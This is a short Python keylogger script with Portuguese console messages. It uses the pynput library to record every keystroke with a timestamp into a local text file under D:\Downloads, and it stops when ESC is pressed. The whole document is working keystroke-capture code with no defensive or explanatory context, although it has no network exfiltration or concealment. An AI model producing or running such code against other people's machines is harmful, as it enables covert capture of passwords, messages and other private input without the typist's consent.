from pynput import keyboard
import datetime
import os

log_file = r"D:\Downloads\keylog.txt"

if not os.path.exists(os.path.dirname(log_file)):
    os.makedirs(os.path.dirname(log_file))

def on_press(key):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(f'{timestamp}: {key.char}\n')
            else:
                f.write(f'{timestamp}: {str(key)}\n')
    except Exception as e:
        print(f"Erro ao registrar tecla: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger iniciado. Pressione ESC para sair.")
    listener.join()
